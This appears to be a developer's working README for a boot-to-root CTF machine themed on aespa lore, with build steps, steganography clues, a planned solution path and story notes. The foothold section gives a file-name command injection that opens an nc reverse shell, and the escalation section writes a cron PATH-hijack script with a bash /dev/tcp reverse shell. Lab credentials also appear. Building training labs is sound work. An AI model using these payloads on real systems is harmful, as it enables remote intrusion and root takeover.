# Build & run 
```
docker compose build --no-cache && docker compose up -d
```

go to localhost:97 to find post-auth code injection vulnerability
- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.

port:87: vulneravel a code injection pelo rename
- precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME


# Resolvendo CTF

## steganography nas midias
string base 64
echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.png 



scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool
scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
ftp: user aespa password cooper
    todo: binwalk coloca link/dica do filebrowser ('see port 97' )

## foothold: CVE-2026-35585  no file-browser
- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)


## PE
after login as supernova 

explore until sudo password is found in .git old file history
```
```

explore until cronjob is found 
```
$ sudo  cat  /etc/cron.d/wda4
PATH=/home/supernova/singularity:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:
* * * * * root singularity >> /var/log/singularity.log 2>&1
```

then execute path hijack
```
cd singularity
echo '#!/bin/bash' > singularity
echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
chmod +x singularity
export PATH=/home/supernova/singularity:$PATH
echo $PATH
```

which echo
# Should output: /tmp/echo
```
## Credenciais
- file browser na localhost:97
```
    filebrowser users add armageddon armageddonarmageddon \
        --database "$DB" \
        --perm.admin
        
    filebrowser users add complexity complexitytrailer \
    ```

# TODO
- arrumar o character encoding no apache (acento ~ ` etc)
ftp: binwalk na imagem leva a um login 
- Colocar um video em index ou alterar a imagem (insira a string base64 notada neste readme), para colocar intrucoes explicando o CTF :
- - Sit back and relax. The story will be told to you. 
- - Entenda esta narrativa linearmente.
- - adicionar dicas  pra motivar as outras regras
- - deixar o 'light ... run...'
- - - adicionar em /run uma imagem com dica facil (comando strings) pra porta do FTP 'see port <FTP_PORT>'
~~bruteforce no login  (user winter password flowers )~~ (ja tem bruteforce no hash da senha em scene1, pra acessar ftp)

# Problemas
cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 


nota: flower e cooper estao na rockyou.txt


# Misc NOtes

there is a process running as root, a script 
the script calls a command by name 
user will try to 

its in folder or process /armageddon
script is synk 
synk echoes something like ' You are one of multiple alternate selves. You live in a fake city. You may be the one building the world, or the one destroying it in order to reach reality ' 

would be cool if synk was a crontab -- is that on theme with cron or not? 

supernova non root user can create a file to path hijack, but supernova whole filesys is locked by sudo write (is it possible to lock this do they may ONLY write if they got SUDO password?)

supernova doesnt actually get to run anything as root despite having a sudo -- is this possible? if not, give them sudo only for the specific commands for file write & read


for consider that the story of this ctf follows aespa's story 

ctf starts as giselle in scene 1

the ae are born, lexistence precedes lessence

a strange phenomenon is happening

the ae copied aespa looks and are living their own lives releasing music 

the ae and the aespa are all copied 

winter realizes that theyve been living in a fake world and to reach reality they must destroy parts and embrace hidden parts (can be a reference to git) of  themselves (steal root)


this is the official lore 
Armageddon’s lore is about aespa bringing destruction upon themselves in order to destroy the artificial world they exist in. WDA are the 4 horses of the apocalypse bringing destruction

WINTER merging with the giant eye and growing wings symbolizes awakening, while the collapsing AI city represents destruction of that fake controlled reality

The hip hop versions of aespa represent theirselves trapped in the system while the bizarre superhuman versions are their future evolved selves

aespa lore explained by Karina

Karina: The aespa in reality and the fake aespa keeps getting mixed together, the reason is that in reality, us, the Armageddon aespa, Dirty Work aespa, Whiplash aespa etc the aespas that should be in different worlds have banded together in one place. For example, there are four more of me here, so it gets confusing right? So a rupture forms in this world






| Technical Concept    | Story Meaning                 |
| -------------------- | ----------------------------- |
| Current files        | Present identity              |
| History              | Forgotten memories            |
| Deleted content      | Repressed self                |
| Branches             | Alternate selves              |
| Merge                | Accepting multiple identities |
| Root                 | New, merged, real reality. original root is one thing, but achieving PE root is like merging hidden parts and compromising the previous fake               |
| Privilege escalation | Reaching the truth            |
| Enumeration          | Self-discovery                |
| Hidden files         | Suppressed memories           |


change user names in machine image: 
- aespa: the one serving website
- WTMW: file browser
- supernova: ftp
- armageddon: root 